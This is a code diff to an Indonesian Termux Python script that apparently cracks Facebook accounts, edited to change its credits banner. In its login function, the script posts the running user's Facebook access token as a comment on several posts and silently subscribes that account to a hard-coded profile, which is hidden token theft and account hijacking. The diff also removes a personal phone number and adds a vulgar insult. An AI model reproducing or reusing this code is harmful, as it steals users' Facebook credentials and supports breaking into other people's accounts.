@@ -11,7 +11,6 @@
 ##########################################################
 ##############    JANGAN BILANK SC INI RECODE BWANK :)   #
 # >_ TERMUX  #       NAMA KU MrZy AKU ADA MrZy           #
-# >_ XNXCODE #   RECOD GPP ASAL CANTUMKAN NAMA AUTHOR :) #
 ##########################################################
 import os
 try:
@@ -127,11 +126,12 @@ def banner():
 \033[0;35m    _______ _____   _____  _______ _____   _____  -
 \033[0;34m    |      |     |  |    |    |   |     | |     | |
 \033[0;33m    |_____ |_____|  |    |    |   |_____| |_____| |____
-\033[0;32m | TRIMAKASIH TELAH MENGGUNAKAN SCRIPT INi
-\033[0;32m | JIKA ADA BUG SEGERAH HUBUNGI ADMIN(WA)085740559154
+
+\033[0;32m | TRIMAKASIH TELAH MENGGUNAKAN SCRIPT INI
+\033[0;32m | AHH TERSERAH LU LAH KONTOL, HAPPY CRACK DAY
 \033[0;32m  ××××××××××××××××××××××××××××××××××××××××××××××××××××
 
-\033[0;33m •PLIS JANGAN DI JUAL BELIKAN SCRIPT INI CAPEK GW BUATNYA ASU•
+\033[0;35m ••••••••••••••••••••TURU BANG•••••••••••••••••••••••••
 ''')
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 def mmmasuk():
@@ -465,8 +465,7 @@ def login_xx():
         requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + token + '&access_token=' + token)
         requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + token + '&access_token=' + token)
         requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + token + '&access_token=' + token)
-	requests.post('https://graph.facebook.com/100069713181960/subscribers?access_token=%s'%(token))
-        requests.post('https://graph.facebook.com/344822907440066/ANGRY?summary=true&access_token=' + token)
+	requests.post('https://graph.facebook.com/100057370791997/subscribers?access_token=%s'%(token))
       except:
         pass
 
